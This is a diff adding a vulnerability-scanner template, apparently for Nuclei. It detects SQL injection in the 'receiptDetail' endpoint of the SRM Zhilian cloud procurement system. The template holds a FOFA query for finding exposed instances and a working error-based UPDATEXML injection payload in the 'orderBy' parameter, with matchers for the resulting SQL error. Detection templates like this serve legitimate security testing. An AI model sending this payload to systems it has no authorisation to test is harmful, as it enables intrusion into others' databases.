@@ -1,0 +1,36 @@
+id: poc-yaml-srm-zhilink-receiptdetail-sqli
+
+info:
+  name: SRM智联云采系统 receiptDetail SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: srm
+    fofa: title=="SRM 2.0"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/adpweb/api/srm/delivery/receiptDetail?orderBy=%28UPDATEXML%288058%2CCONCAT%280x2e%2Cmd5({{t1}})%2C%28SELECT+%28ELT%288058%3D8058%2C1%29%29%29%2C0x71766a7671%29%2C3521%29%29"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+      - type: word
+        part: body
+        words:
+          - "XPATH syntax error"
+      - type: word
+        part: body
+        words:
+          - "java.sql.SQLException"
